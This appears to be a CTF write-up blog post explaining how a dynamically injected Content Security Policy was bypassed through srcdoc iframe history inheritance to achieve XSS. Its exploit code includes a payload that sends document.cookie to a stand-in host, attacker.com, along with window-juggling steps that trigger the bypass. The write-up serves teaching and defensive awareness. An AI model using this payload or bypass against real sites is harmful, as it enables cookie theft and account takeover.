---
title: CTF Writeup — Browser Security Challenge 2025
date: 2025-09-20 08:00:00
categories: Security
tags:
  - Security
  - CTF
  - Browser
---

Writeup for a browser exploitation challenge from a 2025 CTF event. The challenge involved bypassing a Content Security Policy using an iframe sandboxing quirk.

<!-- more -->

## The Challenge

The target app stored user memos and reflected them via `srcdoc` in an iframe. A CSP was injected dynamically via a `<script>` tag:

```javascript
document.head.insertAdjacentHTML(
  "beforeend",
  `<meta http-equiv="Content-Security-Policy" content="script-src 'none';">`
);
```

Goal: achieve XSS and steal the admin's flag cookie.

## Key Observations

1. `srcdoc` iframes inherit CSP from their parent's **session history** — not the current page
2. Sandbox attributes always reflect the **current DOM state**, not history
3. Combining these two behaviors creates a window to bypass the CSP

## The Exploit

```javascript
// Step 1: Open the app with a sandboxed iframe containing our payload
const payload = `<iframe sandbox="allow-same-origin" src="/memo?memo=<script>fetch('https://attacker.com/?c='+document.cookie)<\/script>">`;
const win = window.open(`${challengeHost}/memo?memo=` + payload);

// Step 2: Replace the memo content (clears the srcdoc CSP history)
setTimeout(() => {
  const win2 = window.open(`${challengeHost}/memo?memo=<iframe></iframe>`);
  setTimeout(() => {
    win2.close();
    win.history.back(); // srcdoc now inherits the empty CSP history!
  }, 1000);
}, 1000);
```

## Takeaway

Browser history and CSP inheritance interact in non-obvious ways. Always test srcdoc behavior carefully when building applications that rely on CSP for isolation.
